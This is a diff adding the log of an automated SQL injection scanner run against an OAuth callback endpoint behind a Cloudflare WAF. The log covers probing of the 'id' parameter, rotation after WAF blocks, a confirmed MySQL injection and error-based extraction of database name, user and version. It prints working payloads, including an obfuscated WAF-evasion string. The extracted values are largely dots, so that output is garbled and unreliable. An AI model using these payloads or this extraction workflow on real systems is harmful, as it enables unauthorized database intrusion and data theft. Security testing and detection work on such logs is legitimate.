+    [B-bool] [MySQL] 'id' req#708 sim=0.516 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#709)
+[*] [TECHNIQUE-22] MySQL: 63 consecutive WAF blocks — rotating to next DBMS 
+[*] ├─ [1/10] MySQL › Boolean    │ tech=IN   │ 634 base payloads (3181 expanded)
+[*] testing 'MySQL inline subquery' (param='id' req#770)
+    [B-bool] [MySQL] 'id' req#688 sim=0.562 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#689)
+[*] testing 'MySQL header boolean-blind' (param='id' req#771)
+[*] testing 'MySQL inline subquery' (param='id' req#772)
+    [B-bool] [MySQL] 'id' req#690 sim=0.531 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#691)
+[*] testing 'MySQL header boolean-blind' (param='id' req#773)
+[*] testing 'MySQL inline subquery' (param='id' req#774)
+[*] testing 'MySQL inline subquery' (param='id' req#775)
+    [B-bool] [MySQL] 'id' req#692 sim=0.531 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#693)
+[*] testing 'MySQL header boolean-blind' (param='id' req#776)
+[*] testing 'MySQL inline subquery' (param='id' req#777)
+    [B-bool] [MySQL] 'id' req#694 sim=0.547 combined=0.700 thresh=0.800 (diff) DIFF
+[*] testing 'MySQL inline subquery' (param='id' req#778)
+[*]    Wasserstein comparison probe (param='id' req#695)
+[*] testing 'MySQL header boolean-blind' (param='id' req#779)
+    [B-bool] [MySQL] 'id' req#696 sim=0.516 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#697)
+[*] testing 'MySQL header boolean-blind' (param='id' req#780)
+    [IN-inline] [MySQL] req#715 err=True status=200  ERROR found
+    [B-bool] [MySQL] 'id' req#698 sim=0.438 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#699)
+[*] testing 'MySQL header boolean-blind' (param='id' req#781)
+[*]     IN multi-probe: 2/2 passed
+[*]     IN clean probe (false-cond): error absent  confirmed
+[*] Running PCV on IN→IN detection (MySQL)...
+[*] [diag] _try_technique: tech=BH dbms=MySQL templates=3181 → testing 636 payloads
+[*] [SURFACE] Header scan complete  no injections found
+[*]   [PCV] Using exact detection payload (bypass mutation for 100% reproduction)
+[*]   [PCV] Post-confirmation verification (3 checks with fallbacks)...
+    [CTX-error] order_by: error pattern found  verifying
+    [CTX-error] multi=1/2 clean=ok
+    [CTX-bool] order_by: sim_t=1.000 sim_f=1.000 gap=0.000 need=0.250  gap too small
+    [CTX-error] limit_offset: error pattern found  verifying
+    [CTX-error] multi=1/2 clean=fail
+    [CTX-bool] limit_offset: sim_t=1.000 sim_f=1.000 gap=0.000 need=0.250  gap too small
+    [CTX-error] where_equals: error pattern found  verifying
+[*]     Check A (body canary): FAIL (no-gap-above-threshold)
+[*]     Check C (error fingerprint): PASS via extractvalue  waf_block_detected + HTTP 500
+    [CTX-error] multi=1/2 clean=fail
+    [CTX-bool] where_equals: sim_t=1.000 sim_f=1.000 gap=0.000 need=0.250  gap too small
+[*]     Check D (header diff): FAIL (0 diffs)
+[*]     Check E (MySQL SQL/string): PASS  det+DBMS-SQL responses consistent (direct_sim=0.953)
+[*]   [PCV] Check C (extractvalue) REQUIRES corroboration for tech=IN — no Check A body signal and no header diff; may be application debug page output, not injection
+[*]   [PCV] Result: CONFIRMED  Check E standalone (direct_sim=0.953≥0.88) — all 6 Check A canary pairs were WAF-blocked (Check A inapplicable, not a FP signal)
+[!] [Gate] KILL  all scanning stopped, extraction-only mode
+[+] PCV CONFIRMED [IN] MySQL  injection verified!
+[*] [MultiVote] Param 'id' voted confidence: 100% (votes: {'IN': 1.0})
+[+] Vulnerability confirmed  param='id' technique=IN dbms=MySQL
+
+[!!] SQL INJECTION CONFIRMED  [IN] MySQL  param='id'
+[+] Technique : IN  DBMS: MySQL  Param: 'id'
+[+] Payload   :  AND (1*1)=(1^0)-- -
+[+] Requests  : 781
+
+[!!] SQL injection confirmed!
+    Parameter : 'id'
+    URL       : /oauth2/callback&response_type=code&rhlk=js&rrk=47
+    Technique : IN
+    DBMS      : MySQL
+    Bypass    : none
+    Confidence: 100%
+    Payload   : '0x1%0c/**/%0cand%0c%0c(true*(1))=(0x1/*1b5qro*/^0)%0cand%0c8130=8130#'
+    Requests  : 718
+
+[*] Injection confirmed on 'id'  launching extraction — all scanning stopped
+[*] [Extraction] _extraction_first running: owner=True active=True param='id'
+[*] Extraction started for 'id'
+    [CTX-bool] having: sim_t=0.484 sim_f=1.000 gap=-0.516 need=0.250  CONFIRMED (1/6)  [reversed-polarity]
+    [CTX-bool] multi-probe FAILED (1/3)
+    [CTX-bool] group_by: sim_t=0.547 sim_f=1.000 gap=-0.453 need=0.250  CONFIRMED (1/6)  [reversed-polarity]
+    [CTX-bool] multi-probe FAILED (1/3)
+    [CTX-error] string_concat: error pattern found  verifying
+    [CTX-error] multi=1/2 clean=ok
+    [CTX-bool] string_concat: sim_t=1.000 sim_f=0.516 gap=0.484 need=0.250  CONFIRMED (1/6)
+    [CTX-bool] multi-probe FAILED (1/3)
+    [CTX-bool] numeric_where: sim_t=0.500 sim_f=0.500 gap=0.000 need=0.250  gap too small
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#782)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#783)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#784)
+[+] [ErrorOracle] Calibrated (body-size mode): true=1273069B vs false=1261887B (ctx="' AND " template: (SELECT IF({cond},1/0,1))...)
+[+] [V25-Extract] ConditionalErrorOracle calibrated for 'id'
+[+] DBMS: MySQL (from detection, skipping fingerprint)
+[+] DBMS: MySQL  (conf=100%)
+[*] [MultiVector] Probing extraction methods for MySQL...
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#785)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#786)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#787)
+[+] [MultiVector] Error-based (EXTRACTVALUE): WORKS 
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#788)
+[+] [MultiVector] Available methods (fastestslowest): error(EXTRACTVALUE), boolean(blind), timing(blind)
+[+] [MultiVector] Upgrading extraction: IN  error-based (EXTRACTVALUE)
+[+] --- Auto-extraction starting ---
+[+] [ErrorExtract] Error-based detection - using conditional error extraction
+[+] [ErrorExtract] DBMS: MySQL
+[+] [ErrorExtract] Using metadata - prefix='' suffix='-- -' (validated)
+[+] [ErrorExtract] Testing error message visibility...
+[!] [ErrorExtract] Primary error template failed
+[!] [ErrorExtract] ✗ Error messages filtered/suppressed by WAF
+[!] [ErrorExtract] Error visibility test failed — attempting extraction anyway (may encounter filtering or wrapped error messages)
+[+] [ErrorExtract] database pos=1 char='.' result='.'
+[+] [DeobfDetect] WAF normalizes through: ['url_single', 'url_double', 'unicode_escape', 'hex_literal', 'overlong_utf8']
+[+] [DeobfDetect] Safe encoding layer: html_entity
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#789)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#790)
+[+] [ErrorExtract] database pos=3 char='.' result='...'
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#791)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#792)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#793)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#794)
+[+] [ErrorExtract] database pos=5 char='.' result='.....'
+[+] Surface 'POST method' found 1 result(s)!
+[*] Waiting for extraction to complete before exiting...
+[+] [ErrorExtract] database pos=6 char='.' result='......'
+[+] [ErrorExtract] database pos=7 char='.' result='.......'
+[+] [ErrorExtract] database pos=8 char='.' result='........'
+[+] [ErrorExtract] database pos=9 char='.' result='.........'
+[+] [ErrorExtract] database pos=10 char='.' result='..........'
+[+] [ErrorExtract] database pos=11 char='.' result='...........'
+[+] [ErrorExtract] database pos=12 char='.' result='............'
+[+] [ErrorExtract] database pos=13 char='.' result='.............'
+[+] [ErrorExtract] database pos=14 char='.' result='..............'
+[+] [ErrorExtract] database pos=15 char='.' result='...............'
+[+] [ErrorExtract] database pos=18 char='.' result='.................'
+[+] [ErrorExtract] database pos=19 char='.' result='..................'
+[+] [ErrorExtract] database pos=21 char='.' result='...................'
+[+] [ErrorExtract] database pos=23 char='.' result='.....................'
+[+] [ErrorExtract] database pos=24 char='.' result='......................'
+[+] [ErrorExtract] database pos=26 char='.' result='........................'
+[+] [ErrorExtract] database pos=27 char='.' result='.........................'
+[+] [ErrorExtract] database pos=28 char='.' result='..........................'
+[+] [ErrorExtract] database pos=29 char='.' result='...........................'
+[+] [ErrorExtract] database pos=30 char='.' result='............................'
+[+] [ErrorExtract] database pos=31 char='.' result='.............................'
+[+] [ErrorExtract] database pos=32 char='.' result='..............................'
+[+] [ErrorExtract] database pos=33 char='.' result='...............................'
+[+] [ErrorExtract] database pos=35 char='.' result='.................................'
+[+] [ErrorExtract] database pos=36 char='.' result='..................................'
+[+] [ErrorExtract] database pos=37 char='.' result='...................................'
+[+] [ErrorExtract] database pos=38 char='.' result='....................................'
+[+] [ErrorExtract] database pos=39 char='.' result='.....................................'
+[+] [ErrorExtract] database pos=40 char='.' result='......................................'
+[+] [ErrorExtract] database pos=41 char='.' result='.......................................'
+[+] [ErrorExtract] database pos=42 char='.' result='........................................'
+[+] [ErrorExtract] database pos=43 char='.' result='.........................................'
+[+] [ErrorExtract] database pos=45 char='.' result='..........................................'
+[+] [ErrorExtract] database pos=46 char='.' result='...........................................'
+[+] [ErrorExtract] database pos=47 char='.' result='............................................'
+[+] [ErrorExtract] database pos=48 char=']' result='............................................]'
+[+] [ErrorExtract] database pos=49 char='.' result='............................................].'
+[+] [ErrorExtract] database pos=50 char='.' result='............................................]..'
+[+] [ErrorExtract] database pos=52 char='.' result='............................................]....'
+[+] [ErrorExtract] database pos=53 char='.' result='............................................].....'
+[+] [ErrorExtract] database pos=54 char='.' result='............................................]......'
+[+] [ErrorExtract] database pos=55 char=']' result='............................................]......]'
+[+] [ErrorExtract] database pos=56 char='.' result='............................................]......].'
+[+] [ErrorExtract] database pos=57 char='.' result='............................................]......]..'
+[+] [ErrorExtract] database pos=58 char='.' result='............................................]......]...'
+[+] [ErrorExtract] database pos=59 char='.' result='............................................]......]....'
+[+] [ErrorExtract] database pos=60 char='.' result='............................................]......].....'
+[+] [ErrorExtract] database pos=61 char='.' result='............................................]......]......'
+[+] [ErrorExtract] database pos=62 char='.' result='............................................]......].......'
+[+] [ErrorExtract] database pos=63 char='.' result='............................................]......]........'
+[+] [ErrorExtract] database pos=64 char='.' result='............................................]......].........'
+[+] [ErrorExtract] ✓ Database: ............................................]......].........
+[+] [ErrorExtract] user pos=1 char='.' result='.'
+[+] [ErrorExtract] user pos=3 char='.' result='...'
+[+] [ErrorExtract] ✓ User: ...
+[+] [ErrorExtract] version pos=1 char='.' result='.'
+[+] [ErrorExtract] version pos=3 char='.' result='...'
+[+] [ErrorExtract] ✓ Version: ...
+[+] [ErrorExtract] ========================================
+[+] [ErrorExtract] PHASE 2: Table Enumeration
+[+] [ErrorExtract] ========================================
+[+] [ErrorExtract] Enumerating tables in database: ............................................]......].........
+[+] [ErrorExtract] Found 0 tables
+[!] [ErrorExtract] No tables found
+[+] [ErrorExtract] ========================================
+[+] [ErrorExtract] EXTRACTION SUMMARY
+[+] [ErrorExtract] ========================================
+[+] [ErrorExtract] Database: ............................................]......].........
+[+] [ErrorExtract] User: ...
+[+] [ErrorExtract] Version: ...
+[+] [ErrorExtract] Dumps: 0 tables dumped
+[+] [ErrorExtract] ========================================
+[+] [ErrorExtract] database: ............................................]......].........
+[+] [ErrorExtract] user: ...
+[+] [ErrorExtract] version: ...
+[+] [ErrorExtract] ✓ Result object populated with extracted data
+[+] [ErrorExtract] ✓ Extraction complete!
+[+] PoC saved: output/poc/poc_id_E.sh, output/poc/poc_id_E.py
+[+] PoC: output/poc/poc_id_E.sh
+[+] Remediation guide: output/remediation_id_E.md
+[*] Extraction completed for 'id'
+[*] Skipping 1 deferred extraction(s)  extraction already ran for []
+[+] 
+
+[+] Scan complete   1145.14s
+[+] Requests sent   1172
+[+] DBMS            MySQL
+[+] WAF             Cloudflare
+[+] Vulnerabilities 1 (id)
+[+] 
+[+] Deduplication: 2 findings  1 unique root causes
+[+] Report: 2 findings, 1 unique root causes
+[+] Report  output/sqlreaper_685177a30749aa2d_1787047660.json
+[+] Executive summary  output/executive_summary.txt
+[+] Confidence matrix  output/confidence_matrix.md
+[+] [Session] Scan complete  saved session cleared
+[+] Response dedup hit rate: 0.0%
